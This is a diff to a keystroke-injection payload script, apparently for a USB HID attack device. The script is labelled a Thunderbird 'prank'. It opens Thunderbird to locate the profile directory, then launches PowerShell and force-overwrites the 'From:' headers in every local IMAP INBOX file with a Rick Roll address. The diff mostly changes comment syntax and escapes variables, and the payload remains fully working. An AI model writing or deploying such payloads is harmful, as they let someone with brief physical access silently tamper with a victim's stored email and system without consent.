@@ -1,16 +1,17 @@
-* REM ###################################################
-* REM #                                                 #
-* REM # Title       : Prank In The Middle - Thunderbird	#
-* REM # Author      : Aleff                 		        #
-* REM # Version	    : 1.0                   		        #
-* REM # Category	  : Prank                 	          #
-* REM # Target	    : Windows 10/11         		        #
-* REM #                                     		        #
-* REM ###################################################
+###################################################
+#                                                 #
+# Title       : Prank In The Middle - Thunderbird	#
+# Author      : Aleff                 		        #
+# Version	    : 1.0                   		        #
+# Category	  : Prank                 	          #
+# Target	    : Windows 10/11         		        #
+#                                     		        #
+###################################################
 
 ATTACKMODE HID
 
-* REM Open Thunderbird and goto settings
+# Open Thunderbird and goto settings
+QUACK DELAY 1500
 QUACK GUI r
 QUACK STRING thunderbird
 QUACK ENTER
@@ -28,7 +29,7 @@ QUACK UPARROW
 QUACK ENTER
 QUACK DELAY 500
 
-* REM Goto profile directory
+# Goto profile directory
 QUACK TAB
 QUACK TAB
 QUACK TAB
@@ -43,7 +44,7 @@ QUACK TAB
 QUACK ENTER
 QUACK DELAY 500
 
-* REM Copy the directory path
+# Copy the directory path
 QUACK TAB
 QUACK TAB
 QUACK TAB
@@ -58,7 +59,7 @@ QUACK DELAY 500
 QUACK ALT F4
 QUACK DELAY 500
 
-* REM Open the powershell and goto the directory
+# Open the powershell and goto the directory
 QUACK GUI r
 QUACK STRING powershell
 QUACK ENTER
@@ -70,38 +71,38 @@ QUACK DELAY 500
 QUACK ENTER
 QUACK DELAY 500
 
-* REM Get the INBOX content and edit it overwriting. Then close the powershell
+# Get the INBOX content and edit it overwriting. Then close the powershell
 QUACK STRING cd ImapMail
 QUACK ENTER
 QUACK DELAY 500
-QUACK STRING $directories = Get-ChildItem -Directory | Select-Object FullName
+QUACK STRING \$directories = Get-ChildItem -Directory | Select-Object FullName
 QUACK ENTER
 QUACK DELAY 500
-QUACK STRING foreach ($dir in $directories) {
+QUACK STRING foreach (\$dir in \$directories) {
 QUACK ENTER
 QUACK DELAY 500
 QUACK STRING # Replace backslashes with slash
 QUACK ENTER
 QUACK DELAY 500
-QUACK STRING $newPath = $dir.FullName -replace '\\', '/'
+QUACK STRING \$newPath = \$dir.FullName -replace '\\', '/'
 QUACK ENTER
 QUACK DELAY 500
 QUACK STRING # Add the sub-string '/INBOX' to the end
 QUACK ENTER
 QUACK DELAY 500
-QUACK STRING $newPath += '/INBOX'
+QUACK STRING \$newPath += '/INBOX'
 QUACK ENTER
 QUACK DELAY 500
 QUACK STRING # Check whether the INBOX file exists
 QUACK ENTER
 QUACK DELAY 500
-QUACK STRING if (Test-Path $newPath) {
+QUACK STRING if (Test-Path \$newPath) {
 QUACK ENTER
 QUACK DELAY 500
 QUACK STRING # Check whether the INBOX file exists
 QUACK ENTER
 QUACK DELAY 500
-QUACK STRING $emails = Get-Content -Path $newPath -Raw
+QUACK STRING \$emails = Get-Content -Path \$newPath -Raw
 QUACK ENTER
 QUACK DELAY 500
 QUACK STRING # Replace email sender with Rick Roll!
@@ -113,13 +114,13 @@ QUACK DELAY 500
 QUACK STRING # and does not contain complex MIME structures
 QUACK ENTER
 QUACK DELAY 500
-QUACK STRING $modifiedEmails = $emails -replace 'From:\s.*\s<(?:[a-z0-9!#$%&*+/=?^_`{|}~-]+(?:\.[a-z0-9!#$%&*+/=?^_`{|}~-]+)*|`\"(?:[\x01-\x08\x0b\x0c\x0e-\x1f\x21\x23-\x5b\x5d-\x7f]|\\[\x01-\x09\x0b\x0c\x0e-\x7f])*`\")@(?:(?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\.)+[a-z0-9](?:[a-z0-9-]*[a-z0-9])?|\[(?:(?:(2(5[0-5]|[0-4][0-9])|1[0-9][0-9]|[1-9]?[0-9]))\.){3}(?:(2(5[0-5]|[0-4][0-9])|1[0-9][0-9]|[1-9]?[0-9])|[a-z0-9-]*[a-z0-9]:(?:[\x01-\x08\x0b\x0c\x0e-\x1f\x21-\x5a\x53-\x7f]|\\[\x01-\x09\x0b\x0c\x0e-\x7f])+)\])>', 'From: Rick Roll <Rick.Roll@tinyurl.com/prinkrollme>'
+QUACK STRING \$modifiedEmails = \$emails -replace 'From:\s.*\s<(?:[a-z0-9!#\$%&*+/=?^_`{|}~-]+(?:\.[a-z0-9!#\$%&*+/=?^_`{|}~-]+)*|`\"(?:[\x01-\x08\x0b\x0c\x0e-\x1f\x21\x23-\x5b\x5d-\x7f]|\\[\x01-\x09\x0b\x0c\x0e-\x7f])*`\")@(?:(?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\.)+[a-z0-9](?:[a-z0-9-]*[a-z0-9])?|\[(?:(?:(2(5[0-5]|[0-4][0-9])|1[0-9][0-9]|[1-9]?[0-9]))\.){3}(?:(2(5[0-5]|[0-4][0-9])|1[0-9][0-9]|[1-9]?[0-9])|[a-z0-9-]*[a-z0-9]:(?:[\x01-\x08\x0b\x0c\x0e-\x1f\x21-\x5a\x53-\x7f]|\\[\x01-\x09\x0b\x0c\x0e-\x7f])+)\])>', 'From: Rick Roll <Rick.Roll@tinyurl.com/prinkrollme>'
 QUACK ENTER
 QUACK DELAY 500
 QUACK STRING # Write the modified content into the INBOX file.
 QUACK ENTER
 QUACK DELAY 500
-QUACK STRING Set-Content -Path $newPath -Value $modifiedEmails -Force
+QUACK STRING Set-Content -Path \$newPath -Value \$modifiedEmails -Force
 QUACK ENTER
 QUACK DELAY 500
 QUACK STRING }
